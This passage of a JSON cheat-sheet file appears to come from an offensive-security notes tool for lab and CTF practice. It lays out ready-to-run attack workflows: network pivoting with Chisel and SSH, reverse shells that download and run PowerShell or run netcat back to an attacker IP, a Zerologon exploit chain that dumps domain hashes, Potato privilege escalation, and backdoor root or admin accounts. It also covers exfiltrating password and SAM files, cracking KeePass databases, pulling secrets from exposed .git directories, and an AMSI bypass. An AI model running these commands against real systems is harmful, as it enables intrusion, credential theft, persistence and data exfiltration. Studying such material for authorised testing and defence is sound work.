    "category": "Tunneling with Chisel",
    "title": "Complete Dual-Homed Example",
    "tags": [
      "Lateral_Movement",
      "Linux",
      "Pivoting",
      "Tunneling",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# Scenario: Victim (10.10.10.100) can access internal network (192.168.100.0/24)"
      },
      {
        "type": "text",
        "content": "# 1. Start server on Kali\nchisel server -p 8000 --reverse --socks5"
      },
      {
        "type": "text",
        "content": "# 2. Upload chisel to victim\nwget http://10.10.14.5/chisel.exe -O C:\\Temp\\chisel.exe"
      },
      {
        "type": "text",
        "content": "# 3. Connect from victim\nC:\\Temp\\chisel.exe client 10.10.14.5:8000 R:socks"
      },
      {
        "type": "text",
        "content": "# 4. Configure ProxyChains on Kali\necho \"socks5 127.0.0.1 1080\" >> /etc/proxychains4.conf"
      },
      {
        "type": "text",
        "content": "# 5. Enumerate internal network\nproxychains nmap -sT -Pn 192.168.100.0/24"
      },
      {
        "type": "text",
        "content": "# 6. Attack internal targets\nproxychains crackmapexec smb 192.168.100.50 -u Administrator -p Password123!\nproxychains impacket-psexec Administrator:Password123!@192.168.100.50\n```"
      },
      {
        "type": "note",
        "content": "This workflow enables full access to the internal network through the compromised dual-homed machine.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Invoke-RunasCs",
    "title": "Complete Example",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```powershell\n# 1. Load Invoke-RunasCs\nIEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-RunasCs.ps1')"
      },
      {
        "type": "text",
        "content": "# 2. Test credentials\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"whoami\""
      },
      {
        "type": "text",
        "content": "# 3. Get reverse shell\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')\""
      },
      {
        "type": "text",
        "content": "# 4. Or execute nc.exe\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"C:\\Temp\\nc.exe 10.10.14.5 443 -e cmd.exe\"\n```"
      },
      {
        "type": "note",
        "content": "This workflow goes from credentials to SYSTEM shell in under 5 minutes.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Zerologon",
    "title": "Complete Example",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [],
    "resources": [],
    "advanced": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# 1. Clone exploit\ngit clone https://github.com/dirkjanm/CVE-2020-1472.git\ncd CVE-2020-1472"
      },
      {
        "type": "text",
        "content": "# 2. Test vulnerability\npython3 zerologon_tester.py DC01 192.168.1.10"
      },
      {
        "type": "text",
        "content": "# 3. Save original hash (if you have creds)\nimpacket-secretsdump 'corp.local/user:password@192.168.1.10' -just-dc-user 'DC01$' > original_hash.txt"
      },
      {
        "type": "text",
        "content": "# 4. Exploit\npython3 cve-2020-1472-exploit.py DC01 192.168.1.10"
      },
      {
        "type": "text",
        "content": "# 5. Dump domain\nimpacket-secretsdump -just-dc -no-pass 'corp.local/DC01$@192.168.1.10' > domain_dump.txt"
      },
      {
        "type": "text",
        "content": "# 6. Extract hashes\ncat domain_dump.txt | grep -E \"(Administrator|krbtgt)\""
      },
      {
        "type": "text",
        "content": "# 7. RESTORE DC PASSWORD (CRITICAL)\npython3 restorepassword.py corp.local/DC01$@DC01 -target-ip 192.168.1.10 -hexpass <OriginalHash>"
      },
      {
        "type": "text",
        "content": "# 8. Use dumped credentials\nimpacket-psexec -hashes :<AdminHash> Administrator@192.168.1.10\n```"
      },
      {
        "type": "note",
        "content": "This workflow demonstrates the complete attack chain from detection to restoration.",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "SSH Pivoting",
    "title": "Complete Pivoting Workflow",
    "tags": [],
    "steps": [
      {
        "title": "Step 1: Establish SSH Tunnel",
        "codes": [
          {
            "lang": "bash",
            "code": "ssh adminuser@10.10.155.5 -i id_rsa -D 9050 -f -N"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Configure ProxyChains",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo nano /etc/proxychains4.conf"
          },
          {
            "lang": "plaintext",
            "code": "quiet_mode\n[ProxyList]\nsocks5 127.0.0.1 9050"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3: Enumerate Internal Network",
        "codes": [
          {
            "lang": "bash",
            "code": "# Discover hosts\nproxychains4 nmap -sT -Pn 192.168.1.0/24 -p 445,3389,5985\n\n# SMB enumeration\nproxychains4 crackmapexec smb 192.168.1.0/24 -u <User> -p <Pass>\n\n# Check for admin access\nproxychains4 crackmapexec smb 192.168.1.0/24 -u <User> -p <Pass> --shares"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: Access Internal Services",
        "codes": [
          {
            "lang": "bash",
            "code": "# WinRM access\nproxychains4 evil-winrm -i 192.168.1.100 -u <User> -p <Pass>\n\n# SMB access\nproxychains4 smbclient //192.168.1.100/C$ -U <User>\n\n# RDP (with local port forward)\nssh adminuser@10.10.155.5 -i id_rsa -L 3389:192.168.1.100:3389\nxfreerdp3 /u:<User> /p:'<Pass>' /v:localhost:3389"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "TTY Shell Stabilization",
    "title": "Complete Stabilization Checklist",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "text",
        "content": "```plaintext\n\u2610 Spawn PTY (python, script, etc.)\n\u2610 Background shell (Ctrl+Z)\n\u2610 Configure terminal (stty raw -echo; fg)\n\u2610 Reset terminal (reset)\n\u2610 Set TERM variable (export TERM=xterm)\n\u2610 Set SHELL variable (export SHELL=bash)\n\u2610 Set terminal size (stty rows X columns Y)\n\u2610 Test tab completion\n\u2610 Test arrow keys\n\u2610 Test Ctrl+C (should work)\n\u2610 Test vim/nano\n```"
      }
    ]
  },
  {
    "category": "KeePass Password Manager",
    "title": "Complete Workflow Example",
    "tags": [],
    "steps": [
      {
        "title": "Step 1: Find KDBX File",
        "codes": [
          {
            "lang": "bash",
            "code": "# During SMB enumeration\nsmbclient //<TargetIP>/Users -U <Username>\nsmb: \\> recurse ON\nsmb: \\> prompt OFF\nsmb: \\> mget *.kdbx"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Extract Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "keepass2john Database.kdbx > keepass.hash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3: Crack Password",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try with John first\njohn keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt\n\n# If John is slow, use Hashcat\nhashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: View Cracked Password",
        "codes": [
          {
            "lang": "bash",
            "code": "john keepass.hash --show\n# Output: Database.kdbx:welcome"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 5: Open Database",
        "codes": [
          {
            "lang": "bash",
            "code": "kpcli --kdb=Database.kdbx\n# Password: welcome\n\nkpcli:/> ls\nkpcli:/> cd Windows\nkpcli:/Windows> ls\nkpcli:/Windows> show 0"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 6: Extract Credentials",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Title: Domain Admin\nUserName: administrator\nPassword: P@ssw0rd123!\nURL: \nNotes: Domain administrator account"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 7: Use Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try the found credentials\nevil-winrm -i <TargetIP> -u administrator -p 'P@ssw0rd123!'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Complete Workflow Example",
    "tags": [],
    "steps": [
      {
        "title": "Step 1: Discover .git Directory",
        "codes": [
          {
            "lang": "bash",
            "code": "curl http://10.10.10.5/.git/config"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Download Repository",
        "codes": [
          {
            "lang": "bash",
            "code": "git-dumper http://10.10.10.5/.git/ ./git-dump\ncd git-dump"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3: View Commit History",
        "codes": [
          {
            "lang": "bash",
            "code": "git log --oneline"
          },
          {
            "lang": "plaintext",
            "code": "a1b2c3d Added database credentials\ne4f5g6h Updated API keys\ni7j8k9l Initial commit"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: Examine Suspicious Commit",
        "codes": [
          {
            "lang": "bash",
            "code": "git show a1b2c3d"
          },
          {
            "lang": "diff",
            "code": "+$db_user = \"admin\";\n+$db_pass = \"SuperSecretPassword123!\";"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 5: Search for More Secrets",
        "codes": [
          {
            "lang": "bash",
            "code": "git log -p | grep -i \"password\"\ngit log -p | grep -i \"api\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 6: Extract Credentials",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Found credentials:\n- Database: admin:SuperSecretPassword123!\n- API Key: sk_live_abc123def456\n- SSH Key: /home/admin/.ssh/id_rsa"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 7: Test Credentials",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try SSH\nssh admin@10.10.10.5\n# Password: SuperSecretPassword123!\n\n# Try database\nmysql -h 10.10.10.5 -u admin -p\n# Password: SuperSecretPassword123!"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Evil-WinRM",
    "title": "Complete Workflow Example",
    "tags": [],
    "steps": [
      {
        "title": "Step 1: Prepare Attack Machine",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create directories for scripts and executables\nmkdir -p /opt/privesc/{scripts,executables}\n\n# Copy PowerShell scripts\ncp /opt/PowerUp.ps1 /opt/privesc/scripts/\ncp /opt/Invoke-Mimikatz.ps1 /opt/privesc/scripts/\n\n# Copy executables\ncp /opt/winPEASx64.exe /opt/privesc/executables/\ncp /opt/Rubeus.exe /opt/privesc/executables/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Connect with All Features",
        "codes": [
          {
            "lang": "bash",
            "code": "evil-winrm -i <TargetIP> -u <Username> -p '<Password>' -s /opt/privesc/scripts -e /opt/privesc/executables"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3: Execute Commands",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Bypass AMSI\nBypass-4MSI\n\n# View available commands\nmenu\n\n# Load and execute PowerShell script\nPowerUp.ps1\nInvoke-AllChecks\n\n# Execute binary\nInvoke-Binary winPEASx64.exe\n\n# Upload file\nupload /opt/nc.exe C:\\Windows\\Temp\\nc.exe\n\n# Download file\ndownload C:\\Users\\Administrator\\Desktop\\flag.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "Complete Workflow Example",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Step 1: Check Privileges",
        "codes": [
          {
            "lang": "bash",
            "code": "whoami /priv"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Look for `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` with status **Enabled**.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Step 2: Identify Windows Version",
        "codes": [
          {
            "lang": "bash",
            "code": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3: Select Tool",
        "codes": [
          {
            "lang": "plaintext",
            "code": "Windows 10/11 or Server 2016+ \u2192 GodPotato or PrintSpoofer\nWindows 8-10 or Server 2012-2019 \u2192 JuicyPotatoNG\nLegacy (7-10 pre-1809) \u2192 JuicyPotato with CLSID"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: Upload Tool",
        "codes": [
          {
            "lang": "powershell",
            "code": "# From attacker machine\npython3 -m http.server 80\n\n# On target\niwr -uri http://<AttackerIP>/GodPotato.exe -Outfile GodPotato.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 5: Execute",
        "codes": [
          {
            "lang": "bash",
            "code": "# Test first\nGodPotato.exe -cmd \"whoami\"\n\n# Get reverse shell\nGodPotato.exe -cmd \"C:\\Windows\\Temp\\nc.exe <AttackerIP> 4444 -e cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 6: Verify SYSTEM",
        "codes": [
          {
            "lang": "bash",
            "code": "whoami\n# Output: nt authority\\system"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Writable etc-passwd",
    "title": "Complete Workflow Example",
    "tags": [],
    "steps": [
      {
        "title": "Step 1: Check if Writable",
        "codes": [
          {
            "lang": "bash",
            "code": "ls -l /etc/passwd\n# Output: -rw-rw-rw- 1 root root 1370 Apr 12 16:44 /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Generate Password Hash",
        "codes": [
          {
            "lang": "bash",
            "code": "openssl passwd Password123\n# Output: $1$xyz$abc123def456ghi789"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3: Add Root User",
        "codes": [
          {
            "lang": "bash",
            "code": "echo 'hacker:$1$xyz$abc123def456ghi789:0:0:root:/root:/bin/bash' >> /etc/passwd"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: Verify Addition",
        "codes": [
          {
            "lang": "bash",
            "code": "tail -1 /etc/passwd\n# Output: hacker:$1$xyz$abc123def456ghi789:0:0:root:/root:/bin/bash"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 5: Switch to New User",
        "codes": [
          {
            "lang": "bash",
            "code": "su hacker\n# Password: Password123"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 6: Verify Root Access",
        "codes": [
          {
            "lang": "bash",
            "code": "whoami\n# Output: root\n\nid\n# Output: uid=0(root) gid=0(root) groups=0(root)\n\ncat /root/root.txt\n# Success!"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "File Transfer Techniques",
    "title": "Complete Workflow Examples",
    "tags": [],
    "steps": [
      {
        "title": "Example 1: Upload Tool to Windows",
        "codes": [
          {
            "lang": "bash",
            "code": "# On Kali - Start SMB server\nimpacket-smbserver share /opt/tools -smb2support"
          },
          {
            "lang": "bash",
            "code": "# On Windows - Copy tool\ncopy \\\\<KaliIP>\\share\\winPEAS.exe C:\\Windows\\Temp\\"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example 2: Exfiltrate Data from Windows",
        "codes": [
          {
            "lang": "bash",
            "code": "# On Kali - Start SMB server\nimpacket-smbserver loot . -smb2support"
          },
          {
            "lang": "bash",
            "code": "# On Windows - Copy sensitive files\ncopy C:\\Users\\Admin\\Desktop\\passwords.txt \\\\<KaliIP>\\loot\\\ncopy C:\\Users\\Admin\\Documents\\*.docx \\\\<KaliIP>\\loot\\"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example 3: Download and Execute Script",
        "codes": [
          {
            "lang": "bash",
            "code": "# On Kali - Start HTTP server\npython3 -m http.server 80"
          },
          {
            "lang": "powershell",
            "code": "# On Windows - Download and execute\nIEX(New-Object Net.WebClient).DownloadString('http://<KaliIP>/PowerUp.ps1')\nInvoke-AllChecks"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example 4: Transfer via Netcat",
        "codes": [
          {
            "lang": "bash",
            "code": "# On Kali - Listen for file\nnc -lvnp 4444 > sam.bak"
          },
          {
            "lang": "bash",
            "code": "# On Windows - Send file\nnc <KaliIP> 4444 < C:\\Windows\\Temp\\sam.bak"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "User Management Commands",
    "title": "Complete Workflow Examples",
    "tags": [],
    "steps": [
      {
        "title": "Example 1: Windows Post-Exploitation",
        "codes": [
          {
            "lang": "bash",
            "code": "# After getting SYSTEM shell\nwhoami\n# Output: nt authority\\system\n\n# Create persistent admin user\nnet user hacker Password123! /add\nnet localgroup Administrators hacker /add\nnet localgroup \"Remote Desktop Users\" hacker /add\n\n# Verify\nnet user hacker\nnet localgroup Administrators"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example 2: Linux Post-Exploitation",
        "codes": [
          {
            "lang": "bash",
            "code": "# After getting root shell\nwhoami\n# Output: root\n\n# Create persistent sudo user\nuseradd -m -s /bin/bash hacker\npasswd hacker\n# Enter password: Password123!\n\n# Add to sudo group\nusermod -aG sudo hacker\n\n# Verify\nid hacker\ngroups hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example 3: Using DeadPotato (Windows)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create admin user with DeadPotato\nDeadPotato.exe -newadmin hacker:Password123!\n\n# Verify\nnet localgroup Administrators\n\n# Login via RDP\n# xfreerdp3 /u:hacker /p:'Password123!' /v:<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Example 4: Writable /etc/passwd (Linux)",
        "codes": [
          {
            "lang": "bash",
            "code": "# Generate password hash\nopenssl passwd Password123!\n# Output: $1$xyz$abc123...\n\n# Add user to /etc/passwd\necho 'hacker:$1$xyz$abc123...:0:0:root:/root:/bin/bash' >> /etc/passwd\n\n# Login as new user\nsu hacker\n# Password: Password123!"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "SSH Pivoting",
    "title": "Configuring ProxyChains",
    "tags": [
      "proxy_dns"
    ],
    "steps": [
      {
        "title": "Edit ProxyChains Configuration",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo nano /etc/proxychains4.conf"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Configuration Settings",
        "codes": [
          {
            "lang": "plaintext",
            "code": "# Enable quiet mode (less output)\nquiet_mode\n\n# Comment out proxy_dns if having issues\n#proxy_dns\n\n# Add SOCKS proxy at the end\n[ProxyList]\nsocks5 127.0.0.1 9050"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Make sure to comment out any other proxies in the [ProxyList] section.",
            "variant": "important"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "Constrained Delegation",
    "title": "Constrained Delegation Enumeration",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Enumeration with BloodHound",
        "codes": [
          {
            "lang": "cypher",
            "code": "# Users\nMATCH (u:User {trustedtoauth:true}) RETURN u.name, u.allowedtodelegate\n\n# Computers\nMATCH (c:Computer {trustedtoauth:true}) RETURN c.name, c.allowedtodelegate\n\n# All\nMATCH (c) WHERE c.allowedtodelegate IS NOT NULL RETURN c.name, c.allowedtodelegate"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumeration with PowerView",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Users\nGet-DomainUser -TrustedToAuth\n\n# Computers\nGet-DomainComputer -TrustedToAuth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Enumeration with NetExec",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Find All Delegation Types",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "nxc_enum",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Hackles (BloodHound)",
        "codes": [
          {
            "lang": "bash",
            "code": "python -m hackles -u neo4j -p '<Neo4jPassword>' --delegation"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "HackTricks Constrained Delegation",
        "url": "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**Requirements:**\n- Control of delegating account (password or hash)\n- Target SPN in *msDS-AllowedToDelegateTo* attribute\n- Network access to target service",
        "variant": "important"
      },
      {
        "type": "note",
        "content": "Accounts with constrained delegation can impersonate any user to specific services **(SPNs) via S4U2Self/S4U2Proxy**.",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "The SPN service class can often be substituted. If delegation is to `time/target`, try `cifs/target`",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "Constrained Delegation",
    "title": "Constrained Delegation Exploitation",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Step 1: Request ticket impersonating admin to target SPN (With Password)",
        "codes": [
          {
            "lang": "bash",
            "code": "getST.py -spn cifs/<Target_domain_local> -impersonate Administrator <Domain>/<User>:<Pass>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Request ticket impersonating admin to target SPN (With Hash)",
        "codes": [
          {
            "lang": "bash",
            "code": "getST.py -spn cifs/<Target_domain_local> -impersonate Administrator -hashes :<NTHash> <Domain>/<User>"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Use the ticket",
        "codes": [
          {
            "lang": "bash",
            "code": "export KRB5CCNAME=Administrator.ccache"
          },
          {
            "lang": "bash",
            "code": "impacket-psexec -k -no-pass <Target_domain_local>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Rubeus S4U Attack",
        "codes": [
          {
            "lang": "powershell",
            "code": ".\\Rubeus.exe s4u /user:<DelegatingUser> /rc4:<NTHash> /impersonateuser:Administrator /msdsspn:cifs/<Target_domain_local> /ptt"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Request ticket impersonating admin to target SPN using **Rubeus**.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Validate Access",
        "codes": [
          {
            "lang": "bash",
            "code": "nxc smb <Target_domain_local> -u Administrator -k --use-kcache"
          },
          {
            "lang": "bash",
            "code": "impacket-secretsdump -k -no-pass <Target_domain_local>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Constrained Delegation",
    "title": "Constrained Delegation Theory",
    "tags": [
      "Active_Directory",
      "Delegation_Abuse",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Rubeus",
      "Windows"
    ],
    "steps": [
      {
        "title": "S4U Extensions",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "- **S4U2Self** - Service requests ticket to itself on behalf of user (impersonation)\n- **S4U2Proxy** - Service requests ticket to allowed service on behalf of user"
          }
        ]
      },
      {
        "title": "Constrained Delegation Flow",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Attack sequence:\n1. Service uses **S4U2Self** to get ticket impersonating target user\n2. Service uses **S4U2Proxy** to get ticket to allowed service\n3. Service accesses allowed service as impersonated user",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks - Constrained Delegation",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/constrained-delegation.html"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Constrained delegation limits which services account can delegate to. Uses **S4U** (Service for User) extensions.",
        "variant": "info"
      },
      {
        "type": "note",
        "content": "**Requirements:**\n- Control of delegating account (password or hash)\n- Target SPN in **msDS-AllowedToDelegateTo** attribute\n- Network access to target service",
        "variant": "important"
      }
    ]
  },
  {
    "category": "Pass-the-Ticket",
    "title": "Convert Ticket Formats [Local]",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "Impacket",
      "Kerberos",
      "Lateral_Movement",
      "Mimikatz",
      "Pass-the-Ticket",
      "Rubeus",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "text",
        "content": "```bash\n# .kirbi (Windows) to .ccache (Linux)\nimpacket-ticketConverter ticket.kirbi ticket.ccache\n```"
      },
      {
        "type": "text",
        "content": "```bash\n# .ccache to .kirbi\nimpacket-ticketConverter ticket.ccache ticket.kirbi\n```"
      }
    ]
  },
  {
    "category": "Password Cracking",
    "title": "Core Concepts",
    "tags": [
      "Credential_Access",
      "Hashcat",
      "Password_Attack"
    ],
    "steps": [
      {
        "title": "Encoding vs Hashing vs Encrypting",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Understanding the differences:\n- **Encoding**: Transforms data into a publicly known scheme for usability\n- **Hashing**: One-way cryptographic function nearly impossible to reverse\n- **Encrypting**: Mapping of input/output data reversible with a key",
            "variant": "info"
          }
        ]
      },
      {
        "title": "CPU vs GPU",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Hardware considerations:\n- **CPU**: 2-72 cores optimized for sequential serial processing\n- **GPU**: 1000s of cores with 1000s of threads for parallel processing",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Cracking Time Formula",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Calculate expected cracking time:\n- **Keyspace**: `charset^length` (e.g., `?a?a?a?a = 95^4 = 81,450,625`)\n- **Hashrate**: hashing function / hardware power\n- **Cracking Time**: `keyspace / hashrate`",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Salt and Iterations",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Hash strengthening:\n- **Salt**: Random data used as additional input to a one-way function\n- **Iterations**: Number of times an algorithm is run over a given hash",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "KeePass Password Manager",
    "title": "Cracking with Hashcat",
    "tags": [],
    "steps": [
      {
        "title": "Identify Hash Mode",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat --help | grep -i \"keepass\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "KeePass mode: 13400",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Basic Cracking",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "With Rules",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Force on VM",
        "codes": [
          {
            "lang": "bash",
            "code": "hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
